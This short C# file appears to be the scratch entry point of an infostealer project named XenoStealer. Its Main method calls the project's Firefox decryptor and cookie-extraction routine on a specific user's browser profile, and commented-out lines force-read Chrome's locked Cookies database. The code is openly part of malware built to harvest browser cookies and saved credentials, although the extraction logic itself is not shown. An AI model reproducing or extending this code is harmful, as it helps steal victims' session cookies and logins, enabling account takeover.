using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;
using XenoStealer.DataExtraction.Browsers;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {

            bool g = Environment.Is64BitProcess;


            GeckoDecryptor a = new GeckoDecryptor(@"C:\Program Files\Mozilla Firefox");
            Gecko.GetCookies(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
            var y = g;
            //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);

            
            //byte[] data=Utils.ForceReadFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
            //bool h = g;

        }
    }
}